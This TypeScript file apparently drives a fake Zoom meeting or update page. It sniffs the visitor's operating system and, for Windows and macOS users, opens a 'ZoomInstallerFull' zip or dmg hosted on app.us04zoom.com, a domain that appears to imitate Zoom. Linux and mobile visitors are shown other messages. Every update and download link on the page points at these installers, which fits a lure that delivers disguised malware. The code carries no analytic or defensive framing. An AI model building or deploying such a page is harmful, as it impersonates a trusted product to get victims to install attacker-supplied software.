import platform from 'platform';

declare global {
	interface Window {
		turnstile: any;
	}
}

const button = document.getElementById('meeting-btn') as HTMLButtonElement
//const textGood = document.getElementById('hidden-text-good') as HTMLParagraphElement
const textPhone = document.getElementById('hidden-text-phone') as HTMLParagraphElement
const textLinux = document.getElementById('hidden-text-linux') as HTMLParagraphElement
//const tos = document.getElementById('tos') as HTMLHeadingElement
const updateLink = document.getElementById('update-link') as HTMLAnchorElement
const asideDownload = document.getElementById('aside-download') as HTMLAnchorElement
const asideUpdate = document.getElementById('aside-update') as HTMLAnchorElement

const osCategory: string = getOSCategory()

const downloadLink = updateLinks(osCategory)

button.addEventListener('click', () => {

	//const res = window.turnstile.getResponce()

	if (osCategory != 'Windows' && osCategory != 'macOS < 15' && osCategory != 'macOS >= 15' && osCategory != "Linux") {
		textPhone.style.display = 'block'
	} else if (osCategory == "Linux") {
		textLinux.style.display = 'block'
	} else {
		window.open(downloadLink, '_blank')
		//textGood.style.display = 'block'
	}
})

function updateLinks(osCategory: string): string {
	let link = ''
	switch (osCategory) {
		case 'Windows':
			link = 'https://app.us04zoom.com/files/windows/ZoomInstallerFull.zip'
			updateLink.href = 'https://app.us04zoom.com/files/windows/ZoomInstallerFull.zip';
			asideDownload.href = 'https://app.us04zoom.com/files/windows/ZoomInstallerFull.zip';
			asideUpdate.href = 'https://app.us04zoom.com/files/windows/ZoomInstallerFull.zip';
			break;
		case 'macOS < 15':
			link = 'https://app.us04zoom.com/files/mac/ZoomInstallerFull.dmg'
			updateLink.href = 'https://app.us04zoom.com/files/mac/ZoomInstallerFull.dmg';
			asideDownload.href = 'https://app.us04zoom.com/files/mac/ZoomInstallerFull.dmg';
			asideUpdate.href = 'https://app.us04zoom.com/files/mac/ZoomInstallerFull.dmg';
			break;
		case 'macOS >= 15':
			link = 'https://app.us04zoom.com/files/mac15/ZoomInstallerFull.dmg'
			updateLink.href = 'https://app.us04zoom.com/files/mac15/ZoomInstallerFull.dmg';
			asideDownload.href = 'https://app.us04zoom.com/files/mac15/ZoomInstallerFull.dmg';
			asideUpdate.href = 'https://app.us04zoom.com/files/mac15/ZoomInstallerFull.dmg';
			break;
	}

	return link
}

function getOSCategory() {
	const os = platform.os;
	if (!os || !os.family) return 'Unknown OS';

	if (os.family === 'Windows') {
		return 'Windows';
	}

	if (os.family === 'OS X' || os.family === 'macOS') {
		const versionStr = os.version || '';
		const majorVersion = parseInt(versionStr.split('.')[0], 10);

		if (!isNaN(majorVersion)) {
			return majorVersion < 15 ? 'macOS < 15' : 'macOS >= 15';
		} else {
			return 'macOS (unknown version)';
		}
	}

	if (os.family.startsWith("Linux")) {
		return "Linux"
	}

	return 'Other OS';
}

